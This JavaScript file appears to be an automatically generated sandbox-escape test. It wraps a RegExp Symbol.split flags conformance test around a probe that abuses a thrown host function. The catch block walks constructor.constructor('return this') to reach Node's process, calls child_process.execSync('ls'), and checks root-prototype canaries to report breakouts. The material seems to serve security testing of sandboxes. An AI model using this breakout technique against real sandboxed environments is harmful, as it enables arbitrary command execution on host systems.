try {
    var flagsArg;
    var re = {};
    re.constructor = function () {
        throw () => {
            return () => {
            };
        };
    };
    re.constructor[Symbol.species] = function (_, flags) {
        flagsArg = flags;
        return /./y;
    };
    re.flags = '';
    RegExp.prototype[Symbol.split].call(re, '');
    assert.sameValue(flagsArg, 'y');
    re.flags = 'abcd';
    RegExp.prototype[Symbol.split].call(re, '');
    assert.sameValue(flagsArg, 'abcdy');
    re.flags = 'Y';
    RegExp.prototype[Symbol.split].call(re, '');
    assert.sameValue(flagsArg, 'Yy');
    re.flags = 'y';
    RegExp.prototype[Symbol.split].call(re, '');
    assert.sameValue(flagsArg, 'y');
    re.flags = 'abycd';
    RegExp.prototype[Symbol.split].call(re, '');
    assert.sameValue(flagsArg, 'abycd');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}